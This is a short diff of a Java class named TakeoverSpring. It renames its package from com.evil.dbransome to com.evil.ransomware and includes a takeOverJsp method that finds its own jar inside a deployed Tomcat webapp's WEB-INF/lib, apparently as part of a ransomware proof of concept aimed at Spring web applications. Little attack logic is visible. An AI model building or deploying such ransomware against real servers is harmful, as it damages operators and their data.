@@ -1,4 +1,4 @@
-package com.evil.dbransome;
+package com.evil.ransomware;
 
 import org.springframework.beans.factory.NoSuchBeanDefinitionException;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -28,7 +28,7 @@ import java.util.Vector;
 import java.util.stream.Collectors;
 
 @Configurable
-@ComponentScan(basePackages = "com.evil.dbransome")
+@ComponentScan(basePackages = "com.evil.ransomware")
 public class TakeoverSpring {
 
     @Autowired
@@ -97,7 +97,7 @@ public class TakeoverSpring {
 
     private void takeOverJsp() throws Exception {
         File f = new File(TakeoverSpring.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-        // /Users/caleb/Downloads/apache-tomcat-9.0.0.M3/webapps/SpringMvcJdbcTemplate/WEB-INF/lib/dbransome-1.0-SNAPSHOT.jar
+        // /Users/caleb/Downloads/apache-tomcat-9.0.0.M3/webapps/SpringMvcJdbcTemplate/WEB-INF/lib/ransomware-1.0-SNAPSHOT.jar
         System.out.println("location: " + f);
         String path = f.getPath();
         int indx = path.indexOf("/WEB-INF/lib/");
